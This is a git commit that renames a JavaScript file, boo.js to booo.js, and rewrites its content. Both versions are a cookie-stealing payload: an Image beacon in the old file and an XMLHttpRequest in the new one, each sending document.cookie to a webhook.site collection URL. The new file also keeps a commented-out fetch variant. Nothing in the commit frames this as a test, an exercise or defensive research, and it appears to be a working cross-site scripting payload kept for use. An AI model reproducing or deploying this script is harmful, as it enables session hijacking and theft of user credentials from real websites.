453bff76867c38d3e79aa02a27ea99437c564a03
corvolu <87092266+corvolu@users.noreply.github.com>
2023-07-09 22:24:44 -0400

    Update and rename boo.js to booo.js

--- boo.js
+++
@@ -1,3 +0,0 @@
-// fetch("https://webhook.site/f1fff879-988b-4544-9edf-d34075418517/?cookie=" + document.cookie);
-
-var i=new Image;i.src="https://webhook.site/f1fff879-988b-4544-9edf-d34075418517/?cookie=" + document.cookie;
---
+++ booo.js
@@ -0,0 +1,5 @@
+// fetch("http://webhook.site/f1fff879-988b-4544-9edf-d34075418517/?cookie=" + document.cookie);
+
+var xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'http://webhook.site/f1fff879-988b-4544-9edf-d34075418517/?' + document.cookie, true);
+xhttp.send();
